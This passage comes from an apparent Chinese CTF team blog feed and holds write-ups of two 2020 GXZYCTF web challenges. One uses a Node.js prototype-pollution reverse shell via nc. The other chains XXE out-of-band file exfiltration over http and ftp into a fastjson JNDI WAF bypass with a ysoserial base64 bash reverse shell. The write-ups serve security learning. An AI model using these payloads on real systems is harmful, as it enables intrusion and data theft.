class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="attribute">url</span>=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:True,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,<span class="attribute">proxies</span>=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br><span class="line"><span class="attribute">r</span>=requests.get(url,proxies=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.textimport requests</span><br><span class="line"><span class="attribute">url</span>=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:True,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,<span class="attribute">proxies</span>=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br></pre></td></tr></table></figure><p>反弹shell成功，<code>cat app.js</code></p><p><img src="/2020/03/09/2020_GXZYCTF_GuessGame/image-20200309222006644.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看到log函数里面有merge，那么可以原型链污染了&lt;/p&gt;
&lt;figure class=&quot;highlight pf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    let &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item = &amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;time&quot;&lt;/span&gt;:new Date().&lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt;String()&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    merge(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item,&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    loginHistory.push(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="JS" scheme="https://boiteam.github.io/categories/Web/JS/"/>
    
    
      <category term="Web_原型链污染" scheme="https://boiteam.github.io/tags/Web-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
      <category term="Web_ReDos盲注" scheme="https://boiteam.github.io/tags/Web-ReDos%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF baby_java</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_baby_java/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_baby_java/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:17:53.175Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png" alt></p><p>很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span>  <span class="meta-string">"bbbbb"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140115614.png" alt></p><p>可以解析xml，比赛时测试带上&amp;，%就会get out hacker ，以为把&amp;和%都禁了，然后就没有然后了，还是对xxe的理解不够深入，然后继续测试，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140602422.png" alt></p><p>这里会触发waf,从这也可以看出，触发waf的时候会返回sus waf detect ! get out bad hacker !  hint: /hint.txt，而之前返回get out hacker  可能时因为语法问题等其他原因，这里过滤了file和ftp等，而且提示我们去读hint.txt，然后尝试外带xxe，<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">这里参考</a></p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140334086.png" alt></p><p>开始看其他的wp上面说有用http读取了hint.txt，而且内容为pom.xml文件，以为是多行的，看了上面这篇文章后，http是不能读多行文件的，然后问了出题人<a href="https://www.cnblogs.com/tr1ple/" target="_blank" rel="noopener">tr1ple</a>师傅，hint.txt是单行的，那么http和ftp应该都可以读了，</p><p>这里我们服务器放的hint.txt如下</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311141839708.png" alt></p><ul><li>http</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%xxe;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">//gx.dtd</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///hint.txt"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%send;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311141959966.png" alt></p><ul><li>ftp</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gxzy.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%xxe;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">//gxzy.dtd</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://ip:2121/%payload;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%trick;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311142521849.png" alt></p><p>按照比赛来这时我们得到了pom.xml文件，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Method%uFF1A post</span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tr1ple<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>baby_java<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-FCS<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flex.blazeds<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flex-messaging-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到有一个/you_never_know_the_path路径，还有1.2.48fastjson,还有这个commons-collections东东，然后查了下fastjson的最近的漏洞，[这篇](<a href="https://0day.design/2020/01/30/fastjson" target="_blank" rel="noopener">https://0day.design/2020/01/30/fastjson</a> 触发流程分析/)文章具体的分析了漏洞，然后这里就贴出payload，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;\"@<span class="built_in">type</span>\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure><p>然后用这个payload打的话，还是会触发waf,</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311143155288.png" alt></p><p>然后测试发现对type和prefix进行了过滤，从上面那篇文章可以知道</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311143500149.png" alt></p><p>那么就可以通过十六进制绕过type的过滤，然后就是prefix的绕过，</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311144231267.png" alt></p><p>然后这里就通过在prefix前面加-来绕过，然后就是在vps上开一个JRMPListener,然后通过fastjson的漏洞触发服务器连接vps的JRMPListener，然后给服务器发送序列化的payload,触发服务器反序列化，最后rce。</p><p>payload：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">java -cp ysoserial<span class="selector-class">.jar</span> ysoserial<span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span>  <span class="number">8888</span> CommonsCollections5 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNTAwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"@\x74ype"</span>:<span class="string">"org.apache.commons.configuration.JNDIConfiguration"</span>,<span class="string">"-prefix"</span>:<span class="string">"rmi://144.34.200.151:8888/Exploit"</span>&#125;</span><br></pre></td></tr></table></figure><p>成功反弹shell。</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311145143273.png" alt></p><p>另外还有用在vps上开了一个LDAPServer,来反弹shell，由于java还不是太熟，这里没有复现。</p><p>参考：<a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Java" scheme="https://boiteam.github.io/categories/Web/Java/"/>
    
    
      <category term="Web_XXE" scheme="https://boiteam.github.io/tags/Web-XXE/"/>
    
